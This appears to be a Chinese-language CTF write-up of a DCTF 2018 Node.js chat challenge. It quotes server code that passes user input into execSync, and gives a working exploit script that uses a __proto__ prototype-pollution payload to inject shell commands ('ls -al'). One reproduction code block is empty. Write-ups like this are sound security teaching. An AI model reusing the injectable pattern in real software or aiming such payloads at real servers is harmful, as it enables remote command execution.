# Node.js Vulnerabilities
## prototype pollution attack
https://xz.aliyun.com/t/2802

題目是一個由Node.js編寫的基於socket.io的聊天應用，我們可以從 [https://dctf.def.camp/dctf-18quals-81249812/chat.zip](https://dctf.def.camp/dctf-18quals-81249812/chat.zip) 下載源碼
客戶端的代碼非常簡單，分析 client.js 我們可以發現其只是向服務端註冊用戶並發送消息：
```javascript
const io = require('socket.io-client')
const socket = io.connect('https://chat.dctfq18.def.camp')

if(process.argv.length != 4) {
  console.log('name and channel missing')
   process.exit()
}
console.log('Logging as ' + process.argv[2] + ' on ' + process.argv[3])
var inputUser = {
  name: process.argv[2],
};

socket.on('message', function(msg) {
  console.log(msg.from,"[", msg.channel!==undefined?msg.channel:'Default',"]", "says:\n", msg.message);
});

socket.on('error', function (err) {
  console.log('received socket error:')
  console.log(err)
})

socket.emit('register', JSON.stringify(inputUser));
socket.emit('message', JSON.stringify({ msg: "hello" }));
socket.emit('join', process.argv[3]);//ps: you should keep your channels private
socket.emit('message', JSON.stringify({ channel: process.argv[3], msg: "hello channel" }));
socket.emit('message', JSON.stringify({ channel: "test", msg: "i own you" }));
```

所以我們需要繼續審計服務端的代碼，可以看到 server.js 中存在著很一個敏感的函數 `getAscii`，在分析了其對應的代碼後，可以發現其中存在著一個很明顯的 command injection 問題：
```javascript
getAscii: function(message) {
    var e = require('child_process');
    return e.execSync("cowsay '" + message + "'").toString();
}
```

只要我們構造`message = "aaa';ls -al; echo 'xxx"`，就會服務器將命令`cowsay 'aaa'; ls -al; echo 'xxx'`執行後的查詢查詢結果發送給我們。

那麼我們需要關注的下一個問題則是哪裡會調用`getAscii`函數，可以發現服務端會在監聽到`join`和`leave`兩個事件的時候觸發該函數：
```javascript
client.on('join', function(channel) {
    try {
        clientManager.joinChannel(client, channel);
        sendMessageToClient(client,"Server", 
            "You joined channel", channel)

        var u = clientManager.getUsername(client);
        var c = clientManager.getCountry(client);

        sendMessageToChannel(channel,"Server", 
            helper.getAscii("User " + u + " living in " + c + " joined channel"))
    } catch(e) { console.log(e); client.disconnect() }
});

client.on('leave', function(channel) {
    try {
        client .join(channel);
        clientManager.leaveChannel(client, channel);
        sendMessageToClient(client,"Server", 
            "You left channel", channel)

        var u = clientManager.getUsername(client);
        var c = clientManager.getCountry(client);
        sendMessageToChannel(channel, "Server", 
            helper.getAscii("User " + u + " living in " + c + " left channel"))
    } catch(e) { console.log(e); client.disconnect() }
});
```

所以下一個問題則變成瞭如何控制變量`u`或`c`，即用戶輸入的用戶名和國家，但問題是不是這麼簡單呢？當然不是，服務端會對用戶的輸入做非常嚴格的校驗：
```javascript
validUser: function(inp) {
    var block = ["source","port","font","country",
                    "location","status","lastname"];
    if(typeof inp !== 'object') {
        return false;
    } 

    var keys = Object.keys(inp);
    for(var i = 0; i< keys.length; i++) {
        key = keys[i];

        if(block.indexOf(key) !== -1) {
            return false;
        }
    }

    var r =/^[a-z0-9]+$/gi;
    if(inp.name === undefined || !r.test(inp.name)) {
        return false;
    }

    return true;
}
```

可以看到由於正則檢查的存在，我們根本無法在`name`屬性注入代碼，而且由於黑名單的限制，我們也無法直接給`country`屬性賦值，我們可以使用prototype pollution attack來間接複寫country屬性。

具體操作如下：

1. 通過我們給對象的__proto__屬性賦值，構造出{"name":"xxx", "__proto__":{"country":"xxx';ls -al;echo 'xxx"}}
1. 在服務端接收該對象並調用clone函數後，攻擊生效。此時訪問對象的國家屬性，會得到我們注入的"xxx';ls -al;echo 'xxx"
1. 端的服務執行getAscii函數，觸發命令注入
1. 繼續改寫有效載荷，成功獲取標誌

![](https://i.imgur.com/8YfbuEZ.png)

```javascript
const io = require('socket.io-client')
const socket = io.connect('https://chat.dctfq18.def.camp')

socket.on('error', function (err) {
  console.log('received socket error:')
  console.log(err)
})

socket.on('message', function(msg) {
  console.log(msg.from,"[", msg.channel!==undefined?msg.channel:'Default',"]", "says:\n", msg.message);
});

socket.emit('register', `{"name":"xxx", "__proto__":{"country":"xxx';ls -al;echo 'xxx"}}`);
socket.emit('message', JSON.stringify({ msg: "hello" }));
socket.emit('join', 'xxx');
```

可以看到上題中，在收到客戶端的數據後，服務端會先調用JSON.parse解析用戶輸入，然後再調用克隆函數：`newUser = helper.clone(JSON.parse(inUser))`，而問題恰好出在`clone()`上，我們可以編寫代碼來復現該操作：
```

```
運行代碼，可以發現在調用`clone`函數之前，我們嘗試訪問`oldObj`的`oops`屬性，得到的結果是`undefined`，該屬性不存在;但在克隆後得到的新對象`newObj`中，我們成功訪問到了原本不存在的`oops`屬性。

很明顯，在調用`Object.getOwnPropertyNames(obj);`後獲得的鍵名中存在`__proto__`，因為在這裡`__proto__`屬性是`obj`對象的一個普通的自有屬性，所以可以被該函數所返回，而一般對象的`__proto__`屬性是不會被該函數所列舉出來的。而之後的`newObj['__proto__'] = clone(obj['__proto__']);`賦值操作使得`newObj`的原型發生了變化。

![](https://i.imgur.com/PV4rCxn.png)

三個對象分別調用`xxx.hasOwnProperty('__proto__')`函數，我們可以發現只有`oldObj`在調用該函數時返回了真;而在調用`Object.getPrototypeOf(xxx)`後，只有`newObj`和`oriObj`返回的是`Object {oops: "It works !"}`，`oldObj`返回的是`Object {constructor: , __defineGetter__: , __defineSetter__: , hasOwnProperty: , __lookupGetter__: , …}`。這說明`oldObj`的`__proto__`屬性與其餘二者不同，並非是指向原型的屬性，而是一個普通的自有屬性，與其餘的自有屬性並沒有什麼區別，只是恰好名字較為敏感。